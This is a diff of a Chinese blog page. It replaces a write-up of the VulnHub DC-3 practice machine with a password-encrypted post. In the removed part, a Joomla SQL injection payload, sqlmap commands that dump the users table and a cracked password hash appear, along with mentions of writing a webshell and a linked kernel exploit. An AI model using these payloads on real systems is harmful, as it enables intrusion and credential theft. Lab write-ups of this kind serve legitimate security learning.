@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
+  <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
   <meta name="author" content="何止">
   <meta name="keywords" content="">
   
-  <title>DC系列靶机第三篇 - 何止</title>
+  <title>给小祖的一句话 - 何止</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="DC系列靶机第三篇">
+            <span class="h2" id="subtitle" title="给小祖的一句话">
               
             </span>
 
@@ -190,8 +190,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-01-04 20:34" pubdate>
-        2022年1月4日 晚上
+      <time datetime="2022-05-07 00:00" pubdate>
+        2022年5月7日 凌晨
       </time>
     </span>
   
@@ -202,7 +202,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      564 字
+      6 字
     </span>
   
 
@@ -212,7 +212,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      1
        分钟
     </span>
   
@@ -244,87 +244,27 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">DC系列靶机第三篇</h1>
+            <h1 style="display: none">给小祖的一句话</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：4 个月前
+                  本文最后更新于：几秒前
                 
               </p>
             
             <div class="markdown-body">
-              <blockquote>
-<p>  资源地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-3-2.zip">https://download.vulnhub.com/dc/DC-3-2.zip</a></p>
-<p>  本机：192.168.3.15</p>
-<p>  靶机：192.168.3.19</p>
-</blockquote>
-<h2 id="1-主机发现-amp-信息收集"><a href="#1-主机发现-amp-信息收集" class="headerlink" title="1. 主机发现&amp;信息收集"></a>1. 主机发现&amp;信息收集</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">nmap 192.168.3.0/24<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1txd1h3aj30va07at9t.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104184427120"></p>
-<p>首页面给我们了信息，“只有一个flag，需要提权到root”</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u0hwug6j31ho0q0wh9.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104184529529"></p>
-<p>可以发现web是旧梦</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u0mhsqej30rg0pi0uy.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104184741179"></p>
-<p>joomscan扫一下</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">joomscan -u <span class="hljs-string">&quot;http://192.168.3.19/&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vcgngk6j30dt0f1abf.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104190310570"></p>
-<h2 id="2-漏洞测试-amp-利用"><a href="#2-漏洞测试-amp-利用" class="headerlink" title="2. 漏洞测试&amp;利用"></a>2. 漏洞测试&amp;利用</h2><h3 id="sql注入部分"><a href="#sql注入部分" class="headerlink" title="sql注入部分"></a>sql注入部分</h3><p>首先测试注入漏洞，搜索常见joomla漏洞测试即可，发现存在sql注入</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1u886xtpj31ga0tc77o.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104185520424"></p>
-<p>sqlmap一下</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python3 sqlmap.py -u <span class="hljs-string">&quot;http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=1&quot;</span> --dbs --batch<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vc8qpv5j316o0i6n1q.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104185451119"></p>
-<p>跑出来了一些字段</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uof1e8oj31oq0t8ahf.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104191050990"></p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">python3 sqlmap.py -u <span class="hljs-string">&quot;http://192.168.3.19/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="hljs-string">&quot;joomladb&quot;</span> -T <span class="hljs-string">&quot;#__users&quot;</span> -C <span class="hljs-string">&quot;id,email,name,password,params,params&quot;</span> --dump  -p <span class="hljs-string">&quot;list[fullordering]&quot;</span> --batch<br><br> 629 | freddy@norealaddress.net | admin | $2y$10<span class="hljs-variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span> | &#123;<span class="hljs-string">&quot;admin_style&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;admin_language&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;language&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;editor&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;helpsite&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;timezone&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1ux5e1mvj31ev04jwg0.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104191420675"></p>
-<h3 id="John破解hash"><a href="#John破解hash" class="headerlink" title="John破解hash"></a>John破解hash</h3><blockquote>
-<p>  John the Ripper免费的开源软件，是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。</p>
-</blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> &gt; dc-3hash.txt<br>jhon dc-3hash.txt<br>破解得到密码snoopy<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uxaojm0j30ks0740u4.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104191915310"></p>
-<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>后台地址：<a target="_blank" rel="noopener" href="http://192.168.3.19/administrator/index.php">http://192.168.3.19/administrator/index.php</a></p>
-<p>登陆进后台后有个php管理的模块，可以编辑php，写🐴。</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1v5xif8xj31ds0u0454.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104192743224"></p>
-<p>连接</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vbtz640j31ke0pg43a.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104193324139"></p>
-<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h2><p>发现了sudo ,但是sudo -l无果</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1vdm1zknj31bk0rqgq0.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104193505048"></p>
-<h3 id="查版本"><a href="#查版本" class="headerlink" title="查版本"></a>查版本</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">uname -a<br>lsb_release -a<br>cat /etc/issue<br>cat /proc/version<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wvzjhetj31is08k0ur.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104194042884"></p>
-<h3 id="搜索提权exp"><a href="#搜索提权exp" class="headerlink" title="搜索提权exp"></a>搜索提权exp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">searchsploit Ubuntu 16.04<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wvtm05sj30kp0c5797.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104202712344"></p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>使用39772：<a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a> ，上传后解压</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wuj3zcoj31720d8tcb.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104202556531"></p>
-<p>反弹shell并执行脚本</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wyen7mkj30dn05kt8x.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104202857994"></p>
-<p>执行doubleput，flag在/root下</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1wyatfvzj30i90jljtp.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104202835076"></p>
-<h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><ol>
-<li> 搜索漏洞可以使用<strong>searchsploit</strong></li>
-</ol>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">searchsploit Ubuntu 16.04  <br></code></pre></td></tr></table></figure>
-
-<ol start="2">
-<li> joomla漏洞扫描</li>
-</ol>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">joomscan -u <span class="hljs-string">&quot;http://192.168.3.19/&quot;</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1x7w3m4fj30ef0dy40d.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104203816491"></p>
-<ol start="3">
-<li> John破解hash</li>
-</ol>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span> &gt; dc-3hash.txt<br>jhon dc-3hash.txt<br>破解得到密码snoopy<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy1uxaojm0j30ks0740u4.jpg" srcset="/img/loading.gif" lazyload alt="image-20220104191915310"></p>
-
+              <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="b9455d463c070951eafa593213005cd0cddc66834cd3352bf5be4b2577212baf">c55336795caaf9cece0ef7bb23e704e84d5a0dac4a2556e4af412bcf684a3dba8680865a6c23ef6911616d898aec42b91c5cdf6450b6c02938ede81d60e0652bcf7819e4027abb57d1ba474a93bdcc8409e0d3515185f9db5576fcd743c46d86a80a7fe1f62dcd5ffd08faedd5afc062ae87ac8dbb32a0efd09f27209d2806c09071f4043a1e97f22e2db86c56801663</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
             </div>
             <hr>
             <div>
@@ -344,18 +284,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/01/05/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-4/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">DC系列靶机第四篇</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/01/04/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/DC-2/">
-                        <span class="hidden-mobile">DC系列靶机第二篇</span>
+                      <a href="/2022/01/21/pwnlean/lab1/">
+                        <span class="hidden-mobile">pwn学习之Buffer Overflow</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
